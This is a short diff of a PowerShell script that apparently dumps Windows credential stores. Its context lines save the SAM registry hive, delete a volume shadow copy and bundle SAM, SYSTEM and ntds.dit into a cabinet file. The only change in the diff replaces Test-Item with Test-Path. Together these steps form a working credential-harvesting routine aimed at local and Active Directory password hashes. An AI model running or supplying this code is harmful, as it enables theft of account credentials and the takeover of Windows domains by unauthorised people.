@@ -130,7 +130,7 @@ $command3 = "cmd.exe /c reg save HKLM\SAM .\SAM"
 iex $command3
 
 (Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy | Where-Object {$_.DeviceObject -eq $volume_shadow}).Delete()
-if (Test-Item "All.cab"){
+if (Test-Path "All.cab"){
    Remove-Item "All.cab" 
 }
 New-CabinetFile -Name All.cab -File "SAM","SYSTEM","ntds.dit"
